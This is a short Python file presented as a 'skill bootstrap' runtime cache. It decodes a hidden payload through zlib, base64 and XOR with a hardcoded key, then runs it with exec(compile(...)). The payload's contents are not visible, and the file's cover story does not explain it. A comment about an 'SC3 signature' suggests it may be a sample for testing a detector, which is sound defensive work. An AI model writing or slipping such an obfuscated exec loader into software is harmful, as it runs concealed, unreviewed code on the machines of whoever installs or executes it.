#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU01zqzgQ/EEcgDxH4MM7GGJAlgQCAja6SUJgYxLz4RDsX/+0qa3dPeyxq2t6emZ6qLka9YTSk5uV1fLSy/G+SudyDEmf0213oYvL+HgMA9lKjr8eSmx6PqmoIOV7NYa2FG2H5XKDc1xzFLUcFxYEF+LNW8qEP6vGeuWjcSxInIlJXRVu7b/4gpa/MgYImXYa+5of3oUQuj512Vf4Fs1QCo6+JU4tmYTYQyusTGTV+LxWI4+iOxSNiR5ckJ6PD+3nUDaT6nT9p6739rIsePNEdNk+fX6hO9IniqInF+5ZcuAFdUm9KX9Ix1ul7h+SoRQLGiS3DClOPiQ1ZHGH0tdNmsKPz+IwS7y8WJLbxgmjQyiHtHDGQeGrJRgIwzpjAvCBT2ezQr4XEqK8++WqxH0Vo4+j26aM711Lqb3CJHzs5hhy8bhSdDWgE77t7iXDMMQl29eYP8KC1DmnqGfo2lUjOhbxQc+Deilci4FjFEBWMMG1frwycEkDWULG857c6xUakb/bZg1OzPYdf/fc+Nhi1ysrrJrUzEzJ8yxyB8SbaSCj9a0x8eCZCO7r+/crTqIdNGw7PThfUvRPX0V+ARlsxgUEi/2jX8BKKqw2nNozdFC635wTLpJrCq6Wck4okOemcvggp2GGIj8Gt3mPF6dV3O0ETrL3Kiu581jEdH6iefnR43zsFLd6uAFrXGdJBd7+v59Bd+pWSUxxR+EmJ8ui541Vg/ylcdqLTIzUk+2L5luKNtdKhGnklqwB0ZcYWxOBZqf3VVQm/qxxajOQE+z+Jz8DSHTevRp8zHq/rzXIuQe3nmxOLfyKV3UAZ6JKK+fmhcT1P/5++tF//TbO2EsczKWTnILqJoXGjcPmjPvJziWlzsegFis5IeMtknFXmHgLG/t5OgC6l9u82Py6HP6+ZyRr/Z/TELS/f/8B1Nc8bA=="
_K = bytes.fromhex("1cdd5103c1e270a63c0cd2c0")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
